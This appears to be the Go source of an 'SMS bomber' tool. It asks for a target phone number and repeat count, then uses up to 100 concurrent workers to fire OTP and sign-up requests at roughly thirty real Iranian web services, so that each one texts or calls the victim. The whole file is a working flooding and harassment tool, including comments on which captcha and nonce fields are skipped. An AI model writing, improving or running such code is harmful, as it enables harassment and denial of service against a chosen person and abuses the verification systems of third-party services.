// faghat teste code
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
		                                      :-.
		                                  .:  =#-:-----:
		                                    **%@#%@@@#*+==:
		                                 :=*%@@@@@@@@@@@@@@%#*=:
		                              -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.
		                            . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:
		                          .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.
		                        =% .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:
		                       :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.
		                       #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..
		                      .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
		                       =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#
		                       +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
		                       =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-
		                       .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
		                        #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#
		                        -@@@@*:       . -#@@@@@@#:  .       -#@@@%:
		                        *@@%#           -@@@@@@.            #@@@+
		                         .%@@# @monsmain +@@@@@@=  Sms Bomber #@@#
		                         :@@* =%@@@@@@%-  faster    *@@:
		                          #@@%        .*@@@@#%@@@%+.          %@@+
		                          %@@@+     -#@@@@@* :%@@@@@*-       *@@@*
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
		                          *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=
		                           #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*
		                            =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-
		                              .---@@@@@@@@@%@@@%%@@@@@@@@%:--.
		                                   #@@@@@@@@@@@@@@@@@@@@@@+
		                                    *@@@@@@@@@@@@@@@@@@@@+
		                                     +@@%*@@%@@@%%@%*@@%=
		                                      +%+ %%.+@%:-@* *%-
		                                       .  %# .%#  %+
		                                          :.  %+  :.
		                                               -:
`)
	fmt.Print("\033[0m")


	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // Note: Update these counts based on the final number of added services
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int

	switch strings.ToLower(speedChoice) {
	case "fast":
		numWorkers = 100
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		numWorkers = 30
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		numWorkers = 30
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}


	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel()
	}()

	// تخمین اندازه کانال tasks: تعداد تکرار * (تعداد کل URLهای فعال)
	tasks := make(chan func(), repeatCount*40) // 40 یک تخمین اولیه است، با توجه به تعداد URLهای اضافه شده تنظیم شود

	var wg sync.WaitGroup

	// تخمین اندازه کانال ch: تعداد تکرار * (تعداد کل URLهای فعال)
	ch := make(chan int, repeatCount*40) // 40 یک تخمین اولیه است

	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// --- حلقه اصلی برای اضافه کردن وظایف ---
	for i := 0; i < repeatCount; i++ {
 // fafait.net - hasUser
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "operationName": "hasUser",
            "variables": map[string]interface{}{
                "input": map[string]string{
                    "username": phone,
                },
            },
            // extension field was in the example, but might not be strictly needed for basic request
            // "extensions": map[string]interface{}{ ... },
        }
        sendJSONRequest(ctx, "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
    }

    // fafait.net - with nickname
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            // operationName was not explicitly in the second fafait example, might be inferred or not needed
            // "operationName": "someOperation",
            "variables": map[string]interface{}{
                "input": map[string]string{
                    "mobile": phone,
                    "nickname": "TestUser", // می‌توانید این را تغییر دهید یا تصادفی کنید
                },
            },
            // extension field was in the example, but might not be strictly needed
            // "extensions": map[string]interface{}{ ... },
        }
        sendJSONRequest(ctx, "https://web-api.fafait.net/api/graphql", payload, &wg, ch)
    }

    // tamimpishro.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
            "name": "Test Name", // می‌توانید این را تغییر دهید یا تصادفی کنید
            "national_code": "0000000000", // ممکن است این فیلد اجباری نباشد یا نیاز به مقدار معتبر داشته باشد
            "referrer": "گوگل",
            "return_url": "",
        }
        sendJSONRequest(ctx, "https://www.tamimpishro.com/site/api/v1/user/otp", payload, &wg, ch)
    }

    // gateway.telewebion.com (شامل پارامتر دینامیک g-recaptcha-response)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "code": "98",
            "phone": phone[1:], // حذف صفر اول اگر نیاز باشد، بر اساس نمونه
            "smsStatus": "default",
            // "g-recaptcha-response": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
        }
        sendJSONRequest(ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
    }

    // app.itoll.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://app.itoll.com/api/v1/auth/login", payload, &wg, ch)
    }

    // api.lendo.ir - check-password
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/check-password", payload, &wg, ch)
    }

    // api.lendo.ir - send-otp
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.lendo.ir/api/customer/auth/send-otp", payload, &wg, ch)
    }

    // api.pinorest.com (شامل پارامتر دینامیک captcha)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
            // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
        }
        sendJSONRequest(ctx, "https://api.pinorest.com/frontend/auth/login/mobile", payload, &wg, ch)
    }

    // api.mobit.ir - login
    wg.Add(1)
    tasks <- func() {
         // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "number": phone,
        }
        sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v6/register/login", payload, &wg, ch)
    }

     // api.mobit.ir - register (شامل پارامترهای دینامیک hash_1, hash_2)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "number": phone,
             // این پارامترها دینامیک هستند و ممکن است مشکل ایجاد کنند
            // "hash_1": 1745760096, // این یک عدد است، map[string]string قبول نمیکند
            // "hash_2": "0d6f656b3e726b9180b9572bd8c670ca79c2766d6ea60ca5b2b0fe34cc41f3eb",
        }
        sendJSONRequest(ctx, "https://api.mobit.ir/api/web/v8/register/register", payload, &wg, ch)
    }


    // api.vandar.io (ش شامل پارامتر دینامیک captcha)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
            // "captcha": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
            "captcha_provider": "CLOUDFLARE", // این ممکن است ثابت باشد
        }
        sendJSONRequest(ctx, "https://api.vandar.io/account/v1/check/mobile", payload, &wg, ch)
    }

    // drdr.ir
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://drdr.ir/api/v3/auth/login/mobile/init/", payload, &wg, ch)
    }

    // azki.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "phoneNumber": phone,
            "origin": "www.azki.com",
        }
        sendJSONRequest(ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", payload, &wg, ch)
    }

    // api.epasazh.com
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.epasazh.com/api/v4/blind-otp", payload, &wg, ch)
    }

    // ws.alibaba.ir
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "phoneNumber": phone,
        }
        sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
    }

    // app.ezpay.ir
     wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "phoneNumber": phone,
            "os": "Windows",
            "osVersion": "10",
            "browser": "Chrome",
            "browserVersion": "135.0.0.0", // این ورژن ممکن است نیاز به بروزرسانی داشته باشد
            "device": "",
            "presenterCode": "",
        }
        sendJSONRequest(ctx, "https://app.ezpay.ir:8443/open/v1/user/validation-code", payload, &wg, ch)
    }

    // api.motabare.ir
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            "mobile": phone,
        }
        sendJSONRequest(ctx, "https://api.motabare.ir/v1/core/user/initial/", payload, &wg, ch)
    }

    // oteacher.org (شامل پارامترهای دینامیک client, timestamp, sign)
    wg.Add(1)
    tasks <- func() {
        // اصلاح نوع payload به map[string]interface{}
        payload := map[string]interface{}{
            // "client": "xLjNuxt%2z@", // ممکن است دینامیک باشد
            "mobile": phone,
            // "timestamp": time.Now().UnixNano() / int64(time.Millisecond), // شاید نیاز به timestamp فعلی باشد (عدد است)
            // "sign": "DYNAMIC_VALUE", // این پارامتر دینامیک است و ممکن است مشکل ایجاد کند
        }
         sendJSONRequest(ctx, "https://oteacher.org/api/user/register/mobile", payload, &wg, ch)
    }


    // اضافه کردن وظایف برای URLهای Form Data (این قسمت نیازی به تغییر نوع payload ندارد چون Form Data همیشه کلید-مقدار رشته‌ای است)



    // fankala.com (شامل پارامترهای دینامیک csrf, g-recaptcha-response, dig_nounce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98") // یا بر اساس نیاز، ممکن است نیاز به منطق پیچیده تر برای کد کشور باشد
        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
        // formData.Set("csrf", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        formData.Set("login", "2")
        formData.Set("username", "")
        formData.Set("email", "")
        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
        // formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("digits_reg_name", "Test Name") // می‌تواند ثابت یا تصادفی باشد
        formData.Set("digregcode", "+98")
        formData.Set("digits_reg_mail", phone[1:]) // حذف صفر اول
        formData.Set("digregscode2", "+98")
        formData.Set("mobmail2", "")
        formData.Set("digits_reg_password", "")
        // formData.Set("g-recaptcha-response", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        // formData.Set("gglcptch", "")
        formData.Set("dig_otp", "")
        formData.Set("code", "")
        formData.Set("dig_reg_mail", "")
        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        sendFormRequest(ctx, "https://fankala.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }


    // arastag.ir (شامل پارامتر دینامیک security)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "mreeir_send_sms")
        formData.Set("mobileemail", phone)
        formData.Set("userisnotauser", "")
        formData.Set("type", "mobile")
        // formData.Set("security", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        sendFormRequest(ctx, "https://arastag.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // zzzagros.com (شامل پارامتر دینامیک nonce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "awsa-login-with-phone-send-code")
        // formData.Set("nonce", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        formData.Set("username", phone)
        sendFormRequest(ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // harikashop.com - login
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("back", "my-account")
        formData.Set("username", phone)
        formData.Set("action", "login")
        // formData.Set("back", "https://harikashop.com/") // تکراری، حذف شد
        formData.Set("ajax", "1")
        sendFormRequest(ctx, "https://harikashop.com/login?back=my-account", formData, &wg, ch)
    }

     // harikashop.com - register (ثبت نام - شامل پارامترهای دینامیک و فیلدهای بیشتر)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        // formData.Set("back", "https://harikashop.com/") // ممکن است دینامیک باشد
        formData.Set("id_customer", "")
        // formData.Set("back", "") // تکراری، حذف شد
        formData.Set("firstname", "Test") // می‌توانید تغییر دهید یا تصادفی کنید
        formData.Set("lastname", "User") // می‌توانید تغییر دهید یا تصادفی کنید
        formData.Set("password", "TestPass123") // ممکن است نیاز به پسورد قوی داشته باشد
        formData.Set("action", "register")
        formData.Set("username", phone)
        // formData.Set("back", "https://harikashop.com/") // تکراری، حذف شد
        formData.Set("ajax", "1")
        sendFormRequest(ctx, "https://harika.shop.com/login?back=https%3A%2F%2Fharikashop.com%2F", formData, &wg, ch)
    }//⚠️⚠️⚠️


    // hamrahsport.com
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("cell", phone)
        formData.Set("name", "Test Name") // می‌توانید تغییر دهید یا تصادفی کنید
        formData.Set("agree", "1")
        formData.Set("send_otp", "1")
        formData.Set("otp", "")
        sendFormRequest(ctx, "https://hamrahsport.com/send-otp", formData, &wg, ch)
    }

    // elecmake.com (شامل پارامتر دینامیک security)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "vooroodak__submit-username")
        formData.Set("username", phone)
        // formData.Set("security", "DYNAMIC_VALUE") // این پارامتر دینامیک است
        sendFormRequest(ctx, "https://elecmake.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // roustaee.com (شامل پارامترهای دینامیک csrf, captcha, dig_nounce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98")
        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
        // formData.Set("csrf", "DYNAMIC_VALUE") // دینامیک
        formData.Set("login", "1")
        formData.Set("username", "")
        formData.Set("email", "")
        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
        // formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("mobmail", phone[1:]) // حذف صفر اول
        formData.Set("dig_otp", "")
        formData.Set("rememberme", "1")
        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // دینامیک
        sendFormRequest(ctx, "https://roustaee.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // nazarkade.com - check.mobile.php
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("countryCode", "+98")
        formData.Set("mobile", phone[1:]) // حذف صفر اول
        sendFormRequest(ctx, "https://nazarkade.com/wp-content/plugins/Archive//api/check.mobile.php", formData, &wg, ch)
    }

     // nazarkade.com - admin-ajax.php (شامل پارامترهای دینامیک csrf, captcha, dig_nounce)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("action", "digits_check_mob")
        formData.Set("countrycode", "+98")
        formData.Set("mobileNo", phone[1:]) // حذف صفر اول
        // formData.Set("csrf", "DYNAMIC_VALUE") // دینامیک
        formData.Set("login", "2")
        formData.Set("username", "")
        formData.Set("email", "")
        // formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
        // formData.Set("captcha_ses", "")
        formData.Set("digits", "1")
        formData.Set("json", "1")
        formData.Set("whatsapp", "0")
        formData.Set("digregcode", "+98")
        formData.Set("digits_reg_mail", phone[1:]) // حذف صفر اول
        formData.Set("digits_reg_password", "x") // ثابت یا تغییر دهید
        formData.Set("digits_reg_name", "x") // ثابت یا تغییر دهید
        formData.Set("dig_otp", "")
        formData.Set("code", "")
        formData.Set("dig_reg_mail", "")
        // formData.Set("dig_nounce", "DYNAMIC_VALUE") // دینامیک
        sendFormRequest(ctx, "https://nazarkade.com/wp-admin/admin-ajax.php", formData, &wg, ch)
    }

    // api.snapp.express (شامل پارامترهای دینامیک و کوئری پارامتر در URL)
    wg.Add(1)
    tasks <- func() {
        formData := url.Values{}
        formData.Set("cellphone", phone)
        formData.Set("client", "PWA") // اینها ممکن است ثابت باشند
        formData.Set("optionalClient", "PWA")
        formData.Set("deviceType", "PWA")
        formData.Set("appVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
        formData.Set("clientVersion", "a4547bd9") // ممکن است نیاز به بروزرسانی داشته باشد
        formData.Set("optionalVersion", "5.6.6") // ممکن است نیاز به بروزرسانی داشته باشد
        // formData.Set("UDID", "DYNAMIC_VALUE") // دینامیک
        // formData.Set("sessionId", "DYNAMIC_VALUE") // دینامیک
        formData.Set("lat", "35.774") // ممکن است نیاز به تغییر داشته باشد
        formData.Set("long", "51.418") // ممکن است نیاز به تغییر داشته باشد
        // formData.Set("captcha", "DYNAMIC_VALUE") // دینامیک
        formData.Set("optionalLoginToken", "true") // ممکن است ثابت باشد

        // کوئری پارامترها در URL هم وجود دارند که با این تابع sendFormRequest ارسال می شوند
        urlWithQuery := "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&clientVersion=a4547bd9&optionalVersion=5.6.6&UDID=2bb22fca-5212-47dd-9ff5-e6909df17d6b&sessionId=dc36a2df-587e-412f-96cd-d483d58e3daf&lat=35.774&long=51.418"
        sendFormRequest(ctx, urlWithQuery, formData, &wg, ch)
    }



	} // --- پایان حلقه اصلی برای اضافه کردن وظایف ---


	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	// پردازش نتایج
	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
